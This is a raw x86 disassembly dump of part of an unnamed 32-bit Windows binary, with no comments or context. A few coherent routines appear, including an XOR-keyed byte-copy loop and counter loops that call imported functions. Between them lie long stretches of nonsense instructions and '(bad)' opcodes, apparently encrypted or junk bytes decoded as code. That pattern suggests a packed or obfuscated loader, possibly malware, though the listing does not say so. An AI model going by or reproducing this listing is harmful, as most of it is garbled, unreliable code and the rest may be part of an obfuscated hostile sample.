  407b00:	jp     0x407a92
  407b02:	and    ah,BYTE PTR [edi]
  407b04:	pop    edx
  407b05:	sbb    bl,dh
  407b07:	add    cl,bl
  407b09:	cli    
  407b0a:	clc    
  407b0b:	loop   0x407aaf
  407b0d:	push   eax
  407b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b0f:	(bad)  
  407b10:	pop    ecx
  407b11:	inc    ecx
  407b12:	jle    0x407b6c
  407b14:	sahf   
  407b15:	fsubr  DWORD PTR [eax]
  407b17:	jo     0x407a9c
  407b19:	pop    ecx
  407b1a:	push   cs
  407b1b:	dec    esi
  407b1c:	gs aad 0xf9
  407b1f:	retf   
  407b20:	lock scas eax,DWORD PTR es:[edi]
  407b22:	pop    ds
  407b23:	(bad)  [esi-0x49]
  407b26:	mov    DWORD PTR [esi-0x78cbd10f],edx
  407b2c:	(bad)  
  407b2d:	xor    eax,0x24ae905b
  407b32:	cwde   
  407b33:	push   si
  407b35:	fstp   DWORD PTR [esi-0x24]
  407b38:	retf   0x9c3
  407b3b:	xchg   ebp,eax
  407b3c:	cmp    BYTE PTR ds:0xb32eec9d,cl
  407b42:	fisub  DWORD PTR ss:[ebp+ecx*8-0x3a]
  407b47:	nop
  407b48:	or     BYTE PTR [esi+0x4e811ef3],0x73
  407b4f:	call   0x158:0x2383be70
  407b56:	push   ss
  407b57:	and    edx,DWORD PTR [edx+0x7d]
  407b5a:	loope  0x407b8d
  407b5c:	mov    bl,0xda
  407b5e:	xor    al,0x69
  407b60:	push   cs
  407b61:	cmp    edx,DWORD PTR ds:0x7635c68f
  407b67:	cmp    DWORD PTR [eax+0x59e0331c],esi
  407b6d:	stc    
  407b6e:	aam    0xc7
  407b70:	xor    DWORD PTR [ebx],eax
  407b72:	es int 0x83
  407b75:	jmp    0x407b86
  407b77:	dec    esi
  407b78:	inc    edx
  407b79:	and    DWORD PTR [edi-0x59],esp
  407b7c:	adc    ecx,DWORD PTR [edx+0x1d]
  407b7f:	cld    
  407b80:	fild   DWORD PTR [edx]
  407b82:	outs   dx,BYTE PTR ds:[esi]
  407b83:	cmp    edi,ebx
  407b85:	ret    
  407b86:	das    
  407b87:	retf   0x6506
  407b8a:	add    dl,BYTE PTR [ecx+ebx*1+0x3b5afd27]
  407b91:	lahf   
  407b92:	(bad)  
  407b93:	ds retf 
  407b95:	mov    eax,ds:0x6eb8f746
  407b9a:	inc    ebx
  407b9b:	mov    DWORD PTR es:[eax+0x7d0303fb],edx
  407ba2:	adc    BYTE PTR [ebx],dh
  407ba4:	rol    DWORD PTR [ebx],1
  407ba6:	(bad)  
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x4d61:0x4fdba79
  407cce:	stc    
  407ccf:	jmp    0xdcbefae7
  407cd4:	jg     0x407d54
  407cd6:	jle    0x407c7f
  407cd8:	jp     0x407cbf
  407cda:	cs xor al,cl
  407cdd:	data16 jnp 0x407cc8
  407ce0:	iret   
  407ce1:	lock dec eax
  407ce3:	dec    esp
  407ce4:	add    BYTE PTR [eax+0xd],0xc4
  407ce8:	aad    0x30
  407cea:	push   eax
  407ceb:	scas   eax,DWORD PTR es:[edi]
  407cec:	rcl    dh,cl
  407cee:	arpl   WORD PTR [ebp-0x57],si
  407cf1:	pop    edx
  407cf2:	jp     0x407c9a
  407cf4:	(bad)  
  407cf6:	push   edi
  407cf7:	sub    al,0xcb
  407cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cfa:	loope  0x407d48
  407cfc:	mov    ebp,DWORD PTR [ebp-0x8]
  407cff:	jle    0x407d0a
  407d01:	xor    BYTE PTR [edi],cl
  407d03:	mov    ds:0x7b012f1a,eax
  407d08:	sbb    cl,dl
  407d0a:	fucomi st,st(4)
  407d0c:	add    dh,cl
  407d0e:	call   0x4e64ae3
  407d13:	js     0x407cb1
  407d15:	ss pushf 
  407d17:	dec    ebp
  407d18:	ds ret 0x1102
  407d1c:	fsubr  st(0),st
  407d1e:	add    eax,0x78482003
  407d23:	or     edx,DWORD PTR [ebp+ecx*4+0x79174ecd]
  407d2a:	inc    esp
  407d2b:	jmp    0x2a4e:0x27e65e61
  407d32:	push   0x2a1c84d4
  407d37:	fcmovu st,st(6)
  407d39:	call   0x4f28:0x7c51ce29
  407d40:	cdq    
  407d41:	sbb    eax,0x73d6a2e2
  407d46:	mov    al,BYTE PTR [edi+0x39c1fb94]
  407d4c:	mov    edx,ecx
  407d4e:	loope  0x407d91
  407d50:	cs mov ecx,0x31c75edf
  407d56:	dec    ecx
  407d57:	or     BYTE PTR [esi+ecx*4-0x7a],ch
  407d5b:	fwait
  407d5c:	push   0xffffffcc
  407d5e:	(bad)  
  407d5f:	ss mov edi,0xbd8922fa
  407d65:	stc    
  407d66:	jnp    0x407d5e
  407d68:	retw   
  407d6a:	shl    BYTE PTR [ecx-0x4a],1
  407d6d:	call   0xca:0xb2d42ef2
  407d74:	ins    DWORD PTR es:[edi],dx
  407d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d76:	rcl    DWORD PTR [edi+0x9],0x32
  407d7a:	retf   
  407d7b:	xor    bl,ah
  407d7d:	imul   BYTE PTR ds:0xa570228d
  407d83:	jmp    0x3ba7abbe
  407d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d89:	or     bl,dh
  407d8b:	es ret 
  407d8d:	daa    
  407d8e:	fsubr  st,st(6)
  407d90:	mov    ds:0xd68657f4,eax
  407d95:	sub    al,0x97
  407d97:	adc    al,0x43
  407d99:	push   ss
  407d9a:	mov    BYTE PTR [edi-0x196c50e6],bl
  407da0:	imul   esp,DWORD PTR [edx],0xe3253ced
  407da6:	sbb    eax,0x21b005f1
  407dab:	inc    ebp
  407dac:	addr16 dec edx
  407dae:	xchg   ecx,eax
  407daf:	data16 je 0x407e02
  407db2:	bnd jb 0x407dff
  407db5:	fidivr WORD PTR [ecx+0x39]
  407db8:	call   0x88e87dcb
  407dbd:	xlat   BYTE PTR ds:[ebx]
  407dbe:	(bad)  
  407dbf:	xor    ebp,DWORD PTR [ecx-0x3e17939b]
  407dc5:	add    ebp,DWORD PTR [ebp-0x80]
  407dc8:	repnz leave 
  407dca:	fmul   st,st(2)
  407dcc:	mov    ds:0xd764f32d,al
  407dd1:	or     DWORD PTR [ebx+0x39],0xffffffca
  407dd5:	and    bl,BYTE PTR [esi+0x61]
  407dd8:	mov    al,ds:0x324d9e95
  407ddd:	sbb    edi,DWORD PTR [edi-0x5a85a1a0]
  407de3:	xchg   ebp,eax
  407de4:	pop    ebx
  407de5:	pop    es
  407de6:	or     eax,0x8fb64333
  407deb:	jecxz  0x407e07
  407ded:	mov    ch,0xa0
  407def:	cdq    
  407df0:	push   esi
  407df1:	push   cs
  407df2:	js     0x407daa
  407df4:	sar    BYTE PTR [edx+0x56],cl
  407df7:	pop    ebx
  407df8:	adc    dl,BYTE PTR [eax-0x75]
  407dfb:	mov    eax,ds:0xf43ea46b
  407e00:	and    edx,eax
  407e02:	aad    0xec
  407e04:	or     DWORD PTR [esi],ebp
  407e06:	xchg   ebx,eax
  407e07:	fcomp  DWORD PTR [ebx]
  407e09:	xchg   esp,eax
  407e0b:	and    DWORD PTR [ebx-0xec7390a],ebp
  407e11:	dec    edx
  407e12:	or     eax,0x986a8fc6
  407e17:	rol    BYTE PTR [bp+si+0x39],0x9e
  407e1c:	adc    DWORD PTR [eax-0x1c],0xffffffa7
  407e20:	std    
  407e21:	adc    eax,0x68e002d7
  407e26:	icebp  
  407e27:	rcl    BYTE PTR [ebp+0x18],0x7
  407e2b:	add    bl,BYTE PTR [ebx+0x40]
  407e2e:	pop    esp
  407e2f:	push   esp
  407e30:	(bad)  
  407e31:	inc    ebx
  407e32:	in     eax,dx
  407e33:	mov    ch,0xbb
  407e35:	add    al,ch
  407e37:	loop   0x407dff
  407e39:	cmp    eax,esi
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [edi],esp
  407e84:	lock mov esi,0x7e104fa1
  407e8a:	jle    0x407e68
  407e8c:	jg     0x407f0c
  407e8e:	jle    0x407f0e
  407e90:	xlat   BYTE PTR ds:[ebx]
  407e91:	mov    cl,0xde
  407e93:	jecxz  0x407ef1
  407e95:	or     ebx,DWORD PTR [edi]
  407e97:	(bad)  
  407e98:	aad    0x38
  407e9a:	shl    ecx,0xe9
  407e9d:	imul   ebx,DWORD PTR [edi],0xb9aade6d
  407ea3:	add    DWORD PTR [esi-0x7a37632e],0x480db26e
  407ead:	aad    0xed
  407eaf:	or     edi,DWORD PTR [edx-0x272c48b7]
  407eb5:	jne    0x407ee1
  407eb7:	popa   
  407eb8:	adc    DWORD PTR [ebx+esi*2+0x500da84b],esi
  407ebf:	sbb    DWORD PTR [ecx+edi*4],ebx
  407ec2:	xchg   ebp,eax
  407ec3:	nop
  407ec4:	cmp    al,0xbe
  407ec6:	sub    al,0xda
  407ec8:	fldenv [esi+0x1b]
  407ecb:	cmp    DWORD PTR [eax],edx
  407ecd:	mov    eax,0x218c0193
  407ed2:	xor    edx,DWORD PTR [ecx+0x3699ceb8]
  407ed8:	xor    ah,BYTE PTR [eax]
  407eda:	mov    cl,0xcb
  407edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407edd:	outs   dx,DWORD PTR ds:[esi]
  407ede:	or     eax,0xcab34b0b
  407ee3:	ret    
  407ee4:	sub    al,0x48
  407ee6:	sahf   
  407ee7:	mov    dl,0x7b
  407ee9:	mov    ecx,DWORD PTR [edi+0x21]
  407eec:	mov    eax,0xaeaf4c7b
  407ef1:	int    0xd2
  407ef3:	mov    ch,0x3f
  407ef5:	outs   dx,DWORD PTR ds:[esi]
  407ef6:	test   BYTE PTR [ebp+0x16],bh
  407ef9:	mov    BYTE PTR [eax-0x4bc5e30c],dh
  407eff:	call   0x7c14:0x93aee037
  407f06:	cld    
  407f07:	or     eax,0xf583f503
  407f0c:	mov    al,0xe7
  407f0e:	js     0x407f00
  407f10:	pop    es
  407f11:	(bad)  
  407f12:	cmc    
  407f13:	xchg   edi,eax
  407f14:	aad    0x7c
  407f16:	stos   DWORD PTR es:[edi],eax
  407f17:	ins    BYTE PTR es:[edi],dx
  407f18:	ins    DWORD PTR es:[edi],dx
  407f19:	ret    
  407f1a:	mov    bh,0x97
  407f1c:	jb     0x407eb8
  407f1e:	mov    bh,0xcd
  407f20:	pop    ebx
  407f21:	(bad)  
  407f22:	vunpcklpd xmm0,xmm2,XMMWORD PTR [esi+ebp*4+0x76]
  407f28:	outs   dx,DWORD PTR ds:[esi]
  407f29:	fistp  WORD PTR [edx+0x75fbe47c]
  407f2f:	test   BYTE PTR [ebp+0x27],al
  407f32:	fs cmp al,0x88
  407f35:	fld    TBYTE PTR [ebx]
  407f37:	push   0x1a1bd050
  407f3c:	or     ah,ah
  407f3e:	int3   
  407f3f:	adc    dl,ah
  407f41:	push   es
  407f42:	out    0x96,eax
  407f44:	sub    edi,ecx
  407f46:	pop    ds
  407f47:	std    
  407f48:	leave  
  407f49:	cmp    DWORD PTR [eax],eax
  407f4b:	mov    cl,0x76
  407f4d:	add    eax,0xd383f3cd
  407f53:	fisttp DWORD PTR [esi+0x5312ffdd]
  407f59:	pop    ss
  407f5a:	add    al,0x5e
  407f5c:	inc    ecx
  407f5d:	in     al,dx
  407f5e:	sub    edx,ebp
  407f60:	mov    ch,0x47
  407f62:	or     al,0x3d
  407f64:	and    esi,ebp
  407f66:	nop
  407f67:	sub    dl,BYTE PTR [ebp-0x5a0706ec]
  407f6d:	adc    ecx,eax
  407f6f:	ins    DWORD PTR es:[edi],dx
  407f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f71:	cld    
  407f72:	clc    
  407f73:	aad    0x42
  407f75:	leave  
  407f76:	cmp    ebp,DWORD PTR [esi-0x2c]
  407f79:	hlt    
  407f7a:	add    eax,0x102acc77
  407f7f:	inc    ebx
  407f80:	inc    esi
  407f81:	fdiv   DWORD PTR [edi-0x6038ad98]
  407f87:	push   ss
  407f88:	push   0xe50dfc9b
  407f8d:	or     esi,DWORD PTR [edi+edi*2]
  407f90:	mov    ds:0xd5176d2f,al
  407f95:	into   
  407f96:	pop    edi
  407f97:	mov    ds:0xc9767f29,al
  407f9c:	mov    esp,0xab9ba3b8
  407fa1:	cmc    
  407fa2:	or     BYTE PTR [ecx-0x12bacafc],al
  407fa8:	(bad)  
  407fa9:	add    al,0x47
  407fab:	mov    al,ds:0xdeb2967a
  407fb0:	mov    ds:0x6e5a1d4c,al
  407fb5:	dec    esi
  407fb6:	dec    ebp
  407fb7:	stos   BYTE PTR es:[edi],al
  407fb8:	lock add esp,DWORD PTR es:[ebx]
  407fbc:	test   esp,ebx
  407fbe:	sbb    DWORD PTR [edi-0x2f],edi
  407fc1:	cmp    eax,0xe088d024
  407fc6:	jle    0x407f6b
  407fc8:	lods   eax,DWORD PTR ds:[esi]
  407fc9:	adc    BYTE PTR [edi+0x55],bl
  407fcc:	sti    
  407fcd:	push   ebx
  407fce:	shl    BYTE PTR [eax-0x706a95c7],1
  407fd4:	(bad)  
  407fd5:	mov    ah,0x81
  407fd7:	jnp    0x408052
  407fd9:	pop    ebx
  407fda:	scas   al,BYTE PTR es:[edi]
  407fdb:	or     cl,BYTE PTR [ebx]
  407fdd:	mov    ds:0xf4144112,eax
  407fe2:	enter  0x3fc3,0x90
  407fe6:	cmp    BYTE PTR [edx-0x8],cl
  407fe9:	pop    ecx
  407fea:	in     al,0x4a
  407fec:	cmp    BYTE PTR [ecx-0x34],dh
  407fef:	cmp    al,BYTE PTR [ebx]
  407ff1:	xor    eax,ecx
  407ff3:	add    eax,edx
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	sbb    DWORD PTR [edx-0x32],edi
  408011:	adc    eax,0x7e7e162d
  408016:	fdivr  QWORD PTR [edi+0x7e]
  408019:	jle    0x407fcd
  40801b:	shl    DWORD PTR [edi-0x1d6e32c5],0xd0
  408022:	jg     0x408064
  408024:	cld    
  408025:	leave  
  408026:	push   ds
  408027:	adc    eax,0xfb76bc10
  40802c:	sub    DWORD PTR [edi+0x68],edi
  40802f:	scas   eax,DWORD PTR es:[edi]
  408030:	add    eax,0xedeaca21
  408035:	xchg   edx,eax
  408036:	stc    
  408037:	cmp    al,0xe2
  408039:	jmp    0x7251:0x9443b7c2
  408040:	rcr    DWORD PTR [esp+edi*4-0x29],cl
  408044:	js     0x408040
  408046:	jno    0x408027
  408048:	cld    
  408049:	nop
  40804a:	push   0xf22afd39
  40804f:	scas   al,BYTE PTR es:[edi]
  408050:	fxch   st(1)
  408052:	outs   dx,BYTE PTR ds:[esi]
  408053:	ret    
  408054:	add    al,0x3b
  408056:	inc    ebp
  408057:	cdq    
  408058:	in     eax,dx
  408059:	dec    esp
  40805a:	test   bh,cl
  40805c:	daa    
  40805d:	call   0x5a6b6b83
  408062:	and    ch,dl
  408064:	mov    bh,0xd
  408066:	imul   ebp,DWORD PTR [edx-0x3e],0xffffff8b
  40806a:	loopne 0x408010
  40806c:	(bad)  
  40806d:	das    
  40806e:	les    ebp,FWORD PTR [ebp-0x19]
  408071:	jp     0x4080a0
  408073:	jmp    0x8663:0xe75b5439
  40807a:	add    BYTE PTR [ecx],0xa
  40807d:	cmp    al,0x4c
  40807f:	(bad)  
  408080:	sub    edi,DWORD PTR [ebp-0x2]
  408083:	adc    eax,0xfae43c5c
  408088:	inc    ecx
  408089:	aaa    
  40808a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40808b:	or     eax,0x11d9175a
  408090:	sub    BYTE PTR [ebx],0xdc
  408093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408094:	sbb    bl,BYTE PTR [esi]
  408096:	cdq    
  408097:	mov    ds:0xe1f0d543,al
  40809c:	(bad)  
  40809d:	mov    ebx,0x1f1bf2f6
  4080a2:	or     eax,0xa08e6402
  4080a7:	inc    edi
  4080a8:	push   esp
  4080a9:	or     eax,0xb4f2056e
  4080ae:	xchg   BYTE PTR [ebx+0x3f7ce5f5],dl
  4080b4:	dec    ecx
  4080b5:	cmp    dl,dh
  4080b7:	imul   esi,DWORD PTR [edx-0x11056c00],0xfffffffb
  4080be:	pop    eax
  4080bf:	or     DWORD PTR [bp+di-0x4c],edx
  4080c3:	mov    al,ds:0xf261e53
  4080c8:	aam    0x52
  4080ca:	lods   al,BYTE PTR ds:[esi]
  4080cb:	call   0x20853517
  4080d0:	not    DWORD PTR [ebx+esi*4+0x73]
  4080d4:	ins    DWORD PTR es:[edi],dx
  4080d5:	mov    edx,0x12df6e1b
  4080da:	retf   
  4080db:	pop    ecx
  4080dc:	jb     0x40815d
  4080de:	cwde   
  4080df:	and    bl,BYTE PTR [ecx-0x7baba8ce]
  4080e5:	cs inc ecx
  4080e7:	jnp    0x408070
  4080e9:	fadd   QWORD PTR [edx+0x11]
  4080ec:	xchg   bl,ah
  4080ee:	test   esp,esi
  4080f0:	loopne 0x4080fe
  4080f2:	push   0x1d08dd0d
  4080f7:	lea    edx,[esi-0x6ee71bf9]
  4080fd:	stc    
  4080fe:	add    cl,BYTE PTR ss:[eax+0x62f7214e]
  408105:	and    BYTE PTR [edi],bh
  408107:	sbb    eax,0xe82cf91f
  40810c:	pop    edi
  40810d:	sbb    bl,dl
  40810f:	bound  ebp,QWORD PTR [edi+0x57]
  408112:	push   eax
  408113:	mov    esi,0xc3c4341b
  408118:	sub    BYTE PTR [ecx-0x1e],ah
  40811b:	jp     0x4080fe
  40811d:	jg     0x4080c2
  40811f:	inc    ebp
  408120:	icebp  
  408121:	(bad)  
  408122:	jno    0x4081a1
  408124:	mov    esp,gs
  408126:	jp     0x4081a3
  408128:	push   ebx
  408129:	(bad)  
  40812a:	adc    ah,ch
  40812c:	sub    BYTE PTR ds:0x5044e793,dh
  408132:	in     eax,0x5c
  408134:	push   ebx
  408135:	(bad)  
  408136:	jbe    0x4080e7
  408138:	and    edx,DWORD PTR [edi+0x48]
  40813b:	cmp    DWORD PTR [ecx],ebx
  40813d:	jae    0x4080e6
  40813f:	xlat   BYTE PTR ds:[ebx]
  408140:	inc    edx
  408141:	pusha  
  408142:	loopne 0x408140
  408144:	jae    0x408151
  408146:	pop    esp
  408147:	dec    edx
  408148:	adc    BYTE PTR [ecx+0x7b614fb6],0xa
  40814f:	adc    esp,DWORD PTR [eax-0x5470a78c]
  408155:	test   al,0xde
  408157:	mov    BYTE PTR [eax+ebp*8],0x0
  40815b:	stc    
  40815c:	sbb    eax,0x66ffc690
  408161:	push   esp
  408162:	adc    BYTE PTR [ecx+0x7a],0x38
  408166:	pop    ss
  408167:	jle    0x4081ab
  408169:	adc    BYTE PTR [ebx],ch
  40816b:	push   0x40
  40816d:	lahf   
  40816e:	hlt    
  40816f:	pushf  
  408170:	adc    al,0xb2
  408172:	xchg   ecx,eax
  408173:	xchg   DWORD PTR [ebx+esi*2],ecx
  408176:	jmp    0x5eb922d8
  40817b:	stos   BYTE PTR es:[edi],al
  40817c:	xor    eax,ecx
  40817e:	add    eax,edx
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	ror    BYTE PTR es:[edi],0x6
  4081a3:	pop    ecx
  4081a4:	adc    DWORD PTR [edi],0x7e
  4081a7:	jle    0x408185
  4081a9:	jg     0x408229
  4081ab:	jle    0x408140
  4081ad:	sbb    DWORD PTR [ebx-0xf236ff7],esi
  4081b3:	(bad)  
  4081b4:	adc    eax,0x55dc8d19
  4081b9:	test   BYTE PTR [eax+0x13],bl
  4081bc:	or     dl,BYTE PTR [esp+ecx*8]
  4081bf:	sub    ebx,ecx
  4081c1:	cmp    eax,0x71bee573
  4081c6:	mov    eax,0xd9c259c3
  4081cb:	mov    al,ds:0xd5d553a4
  4081d0:	inc    eax
  4081d1:	jecxz  0x408165
  4081d3:	retf   0x7a6c
  4081d6:	jo     0x408246
  4081d8:	mov    esp,0x458bdbd7
  4081dd:	test   eax,0x13a3820a
  4081e2:	adc    edi,DWORD PTR [edx+0x78]
  4081e5:	fdivr  DWORD PTR [ebx]
  4081e7:	push   es
  4081e8:	jnp    0x4081d2
  4081ea:	cdq    
  4081eb:	int3   
  4081ec:	mov    dh,BYTE PTR ds:0xd23569d2
  4081f2:	ins    DWORD PTR es:[edi],dx
  4081f3:	dec    esp
  4081f4:	push   0xffffffcf
  4081f6:	aad    0x99
  4081f8:	cmp    al,0xe2
  4081fa:	pushf  
  4081fb:	ror    BYTE PTR [edi+0x7d3aa41d],0x2f
  408202:	dec    ebp
  408203:	jl     0x4081d2
  408205:	push   cs
  408206:	sub    al,0x27
  408208:	pop    edx
  408209:	add    BYTE PTR [ebx-0x33],ch
  40820c:	pushf  
  40820d:	push   es
  40820e:	cmp    esi,DWORD PTR [ebx+0x24]
  408211:	mov    al,ds:0x68d5d245
  408216:	daa    
  408217:	add    ebp,ebp
  408219:	sbb    ch,BYTE PTR [esi+0x526c9a0f]
  40821f:	sbb    ebp,DWORD PTR [ebp-0x45]
  408222:	inc    ecx
  408223:	adc    DWORD PTR [esi+0x57],0x37b006b3
  40822a:	fucom  st(6)
  40822c:	mov    esi,0x10f114af
  408231:	add    DWORD PTR [edi],0x12
  408234:	lods   al,BYTE PTR ds:[esi]
  408235:	sub    eax,0xd0774f50
  40823a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40823b:	lahf   
  40823c:	pop    eax
  40823d:	jo     0x4082b6
  40823f:	inc    edx
  408240:	mov    bh,0x6e
  408242:	jnp    0x4081c4
  408244:	pop    eax
  408245:	lock add eax,0x799c667a
  40824b:	add    al,0x3c
  40824d:	cmp    al,BYTE PTR [edi]
  40824f:	leave  
  408250:	mov    esp,0xea59a1cd
  408255:	pop    ss
  408256:	icebp  
  408257:	cmp    dl,cl
  408259:	fwait
  40825a:	popf   
  40825b:	div    DWORD PTR [edx-0x2f]
  40825e:	mov    ch,0xfd
  408260:	in     al,dx
  408261:	mov    edx,ebx
  408263:	jmp    0xb951:0x3be12e29
  40826a:	jb     0x4082aa
  40826c:	dec    edi
  40826d:	ja     0x4082b8
  40826f:	dec    edx
  408270:	pop    ds
  408271:	add    edi,esp
  408273:	dec    esi
  408274:	fsub   DWORD PTR [edi*2+0x52e018a2]
  40827b:	xchg   ebx,eax
  40827c:	jp     0x40824e
  40827e:	xchg   ebp,eax
  40827f:	test   DWORD PTR [ecx+0x5dcf7863],esp
  408285:	adc    ah,BYTE PTR [edx]
  408287:	jmp    FWORD PTR [ebp-0x1e]
  40828a:	xor    DWORD PTR [edi],esp
  40828c:	je     0x4082ac
  40828e:	enter  0x5df1,0x60
  408292:	xor    ah,BYTE PTR [ebp-0x73]
  408295:	and    dh,BYTE PTR [esp+esi*4+0x531c56ab]
  40829c:	push   ebp
  40829d:	pop    ss
  40829e:	mov    bh,0x6a
  4082a0:	fld    QWORD PTR [edi-0x13b9b0fe]
  4082a6:	leave  
  4082a7:	jecxz  0x408245
  4082a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082aa:	add    al,0xcc
  4082ac:	adc    al,0x66
  4082ae:	dec    eax
  4082af:	test   eax,0xf72bad7e
  4082b4:	cmc    
  4082b5:	dec    esp
  4082b6:	mov    dl,0x5e
  4082b8:	repnz jmp FWORD PTR [ecx-0x2126757b]
  4082bf:	loopne 0x4082e1
  4082c1:	and    eax,0x98dd1620
  4082c6:	jne    0x4082d9
  4082c8:	push   esi
  4082c9:	retf   0x33bb
  4082cc:	pop    ebp
  4082cd:	retf   
  4082ce:	sar    eax,1
  4082d0:	inc    eax
  4082d1:	adc    edi,esp
  4082d3:	mov    ch,0x51
  4082d5:	aaa    
  4082d6:	outs   dx,DWORD PTR ds:[esi]
  4082d7:	loope  0x40832a
  4082d9:	call   DWORD PTR [ebp-0x933da72]
  4082df:	fst    st(5)
  4082e1:	test   DWORD PTR [esi],esi
  4082e3:	add    cl,BYTE PTR [esi-0x3666af12]
  4082e9:	or     DWORD PTR [ebx+0x4dc5fa80],eax
  4082ef:	enter  0xbea3,0x2e
  4082f3:	out    0xe6,eax
  4082f5:	mov    BYTE PTR [esi],ah
  4082f7:	mov    DWORD PTR [eax+ecx*2-0xe],esp
  4082fb:	push   edi
  4082fc:	mov    al,0x42
  4082fe:	shr    BYTE PTR [edi-0x3648e80],0xe
  408305:	push   cs
  408306:	xor    edi,DWORD PTR [edx-0x37ef27da]
  40830c:	adc    al,0x95
  40830e:	mov    ds:0x40d64c,eax
  408313:	mov    eax,DWORD PTR [ebp+0x8]
  408316:	mov    eax,DWORD PTR [eax]
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4245ca,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4245ca
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4245ca,ecx
  408347:	cmp    DWORD PTR ds:0x4245ca,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4245ca,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4245ca,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4245ca
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4245ca,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
